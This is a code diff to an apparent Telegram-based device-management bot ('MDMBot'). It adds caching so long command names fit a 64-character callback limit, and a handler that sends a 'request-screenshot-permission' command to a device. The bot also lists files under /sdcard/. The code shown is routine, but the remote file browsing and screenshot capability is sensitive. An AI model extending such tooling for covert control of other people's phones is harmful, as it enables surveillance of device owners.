@@ -343,6 +343,19 @@ def _cb(device_id, action, target):
             else:
                 result = f"{action}:{hash(device_id) % 99999}:p{cache_key}"
         return result[:64]
+    # ⚡ FIX: Cache long commands like "request-screenshot-permission" to avoid truncation
+    if action == "cmd" and target and len(target) > 20:
+        cache_key = str(len(_file_path_cache))
+        _file_path_cache[cache_key] = target
+        result = f"{action}:{device_id}:s{cache_key}"
+        if len(result) > 64:
+            overhead = len(action) + 1 + 1 + len(cache_key) + 1
+            max_did_len = 64 - overhead
+            if max_did_len > 8:
+                result = f"{action}:{device_id[:max_did_len]}:s{cache_key}"
+            else:
+                result = f"{action}:{hash(device_id) % 99999}:s{cache_key}"
+        return result[:64]
     # For non-file actions, use full format but truncate if needed
     return f"{action}:{device_id}:{target}"[:64]
 
@@ -1195,6 +1208,9 @@ class MDMBot:
                 if tgt.startswith("request-permission:"):
                     perm_type = tgt.split(":", 1)[1] if ":" in tgt else ""
                     self._send_cmd(c.message.chat.id, did, "request-permission", {"value": perm_type})
+                # ✅ Handle cached screenshot permission command
+                elif tgt == "request-screenshot-permission":
+                    self._send_cmd(c.message.chat.id, did, "request-screenshot-permission")
                 # For ls command, default to /sdcard/ if no path specified
                 elif tgt == "ls":
                     self._send_cmd(c.message.chat.id, did, "ls", {"value": "/sdcard/"})
